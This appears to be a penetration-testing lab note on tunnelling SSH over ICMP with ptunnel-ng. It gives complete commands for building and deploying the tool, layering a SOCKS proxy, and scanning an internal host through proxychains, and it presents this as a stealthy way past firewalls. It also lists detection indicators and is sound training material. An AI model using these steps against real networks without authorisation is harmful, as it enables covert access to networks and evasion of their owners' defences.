# ICMP Tunnelling with SOCKS (ptunnel-ng)

## Overview

**ICMP tunnelling** encapsulates data inside ICMP echo request and echo reply packets (ping traffic).  
This technique allows communication channels to be created even when traditional protocols such as:

- HTTP
- HTTPS
- SSH
- SMB

are blocked by firewall rules.

Because ICMP is often permitted for network diagnostics, attackers can abuse it to:

- exfiltrate data
- bypass network filtering
- create covert tunnels
- pivot into restricted environments
- establish SOCKS proxies via layered tunnelling

One common tool used for ICMP tunnelling is **ptunnel-ng**.

---

# Why ICMP Tunnelling Works

Many corporate firewalls allow ICMP traffic because:

- ping is used for troubleshooting
- network monitoring tools rely on ICMP
- blocking ICMP can disrupt diagnostics
- ICMP often receives less inspection

ptunnel-ng encapsulates TCP traffic inside ICMP packets, allowing restricted traffic to traverse filtered networks.

---

# Architecture

ptunnel-ng operates in a client-server model:

| Component | Location | Purpose |
|----------|----------|---------|
| ptunnel-ng server | pivot host | receives ICMP packets |
| ptunnel-ng client | attack host | sends ICMP packets |
| SSH tunnel | layered tunnel | enables SOCKS pivoting |

Traffic flow:

```
TCP traffic
      ↓
ICMP encapsulation
      ↓
ping packets
      ↓
ptunnel-ng server
      ↓
forwarded TCP connection
```

---

# Scenario

Pivot host:

```
Ubuntu server
10.129.202.64
172.16.5.129
```

Attack host:

```
10.10.14.18
```

Target network:

```
172.16.5.0/23
```

Goal:

Tunnel SSH over ICMP and pivot into internal network.

---

# Install ptunnel-ng

Clone repository:

```bash
git clone https://github.com/utoni/ptunnel-ng.git
```

---

# Build ptunnel-ng

Run autogen script:

```bash
cd ptunnel-ng
sudo ./autogen.sh
```

---

# Alternative Static Build

Install build dependencies:

```bash
sudo apt install automake autoconf -y
```

Modify build script:

```bash
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
```

Build:

```bash
./autogen.sh
```

Static binaries reduce dependency issues across systems.

---

# Transfer ptunnel-ng to Pivot Host

```bash
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

---

# Start ptunnel-ng Server on Pivot Host

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

---

# Parameter Breakdown

| Parameter | Description |
|----------|-------------|
| -r | destination host |
| -R22 | forward traffic to port 22 |
| sudo | required for raw socket access |

Server listens for ICMP echo requests and forwards TCP traffic internally.

---

# Example Server Output

```text
Starting ptunnel-ng 1.42
Forwarding incoming ping packets over TCP
Ping proxy is listening in privileged mode
Dropping privileges now
```

---

# Connect to ptunnel-ng Server from Attack Host

```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

---

# Parameter Explanation

| Parameter | Description |
|----------|-------------|
| -p | pivot host IP |
| -l2222 | local listening port |
| -r | destination host |
| -R22 | destination port |

Result:

Local port 2222 forwards traffic via ICMP tunnel to SSH port on pivot host.

---

# SSH Through ICMP Tunnel

```bash
ssh -p2222 -lubuntu 127.0.0.1
```

Example:

```text
Welcome to Ubuntu 20.04.3 LTS

System load: 0.0
Memory usage: 37%
```

Connection path:

```
ssh client
     ↓
localhost:2222
     ↓
ptunnel-ng client
     ↓
ICMP packets
     ↓
ptunnel-ng server
     ↓
localhost:22 on pivot host
```

---

# Confirm Tunnel Traffic

Example statistics:

```text
Session statistics:

ICMP packets sent: 248
ICMP packets received: 22
Packet loss: 0.0%
```

Indicates successful encapsulation of TCP traffic within ICMP packets.

---

# Layer SOCKS Proxy over ICMP Tunnel

Create dynamic SSH tunnel:

```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

Local SOCKS proxy created:

```
127.0.0.1:9050
```

---

# Configure Proxychains

Edit configuration:

```bash
sudo nano /etc/proxychains.conf
```

Add:

```bash
socks4 127.0.0.1 9050
```

---

# Pivot into Internal Network

Example Nmap scan:

```bash
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

Example output:

```text
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Service Info: OS: Windows
```

---

# Full Traffic Flow

```
nmap
   ↓
proxychains
   ↓
SOCKS proxy (9050)
   ↓
SSH tunnel
   ↓
ptunnel-ng client
   ↓
ICMP packets
   ↓
ptunnel-ng server
   ↓
internal network
```

---

# Packet Analysis with Wireshark

Without ICMP tunnelling:

```
TCP traffic visible
SSHv2 packets detected
```

With ICMP tunnelling:

```
ICMP echo requests
ICMP echo replies
encoded payload inside ping packets
```

Indicators of tunnelling:

- high volume of ICMP traffic
- large ICMP packet sizes
- unusual frequency of echo requests

---

# Advantages of ICMP Tunnelling

## Bypasses firewall restrictions

ICMP often allowed when TCP blocked.

## Stealth communication channel

Traffic disguised as diagnostic traffic.

## Supports pivoting

Allows access to segmented networks.

## Useful in restricted environments

Effective when HTTP/HTTPS blocked.

---

# Limitations

## Slow throughput

ICMP not optimized for large transfers.

## Requires ICMP allowed outbound

Some networks block ping.

## Detectable anomalies

IDS may detect abnormal ICMP patterns.

## Requires elevated privileges

Raw sockets require root permissions.

## GLIBC compatibility issues

Binary mismatch may cause execution failure.

---

# Comparison with Other Pivot Techniques

| Tool | Protocol | Stealth level |
|------|----------|--------------|
| SSH tunnelling | TCP | medium |
| SOCKS proxy | TCP | medium |
| DNS tunnelling | DNS | high |
| ICMP tunnelling | ICMP | high |
| HTTP tunnelling | HTTP | medium |

---

# Quick Command Reference

## Clone repository

```bash
git clone https://github.com/utoni/ptunnel-ng.git
```

## Build tool

```bash
cd ptunnel-ng
sudo ./autogen.sh
```

## Transfer to pivot host

```bash
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

## Start server

```bash
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

## Start client

```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

## SSH through ICMP tunnel

```bash
ssh -p2222 ubuntu@127.0.0.1
```

## Create SOCKS proxy

```bash
ssh -D 9050 -p2222 ubuntu@127.0.0.1
```

## Scan internal host

```bash
proxychains nmap 172.16.5.19 -p3389
```

---

# Mental Model

ICMP tunnelling hides TCP traffic inside ping packets.

Instead of:

```
attacker → SSH → pivot
```

traffic flows as:

```
attacker
   ↓
ICMP ping packets
   ↓
pivot host
   ↓
internal services
```

Allowing communication even when traditional ports are blocked.

---

# Key Takeaways

- ICMP tunnelling encapsulates TCP traffic in ping packets.
- ptunnel-ng enables pivoting over ICMP.
- useful when TCP traffic restricted.
- supports SOCKS pivoting via SSH layering.
- stealthy but slower communication channel.
- effective in heavily filtered environments.

---

# Tags

#pivoting  
#tunnelling  
#icmp  
#ptunnel  
#socks  
#proxychains  
#redteam  
#networking  
#linux  
#obsidian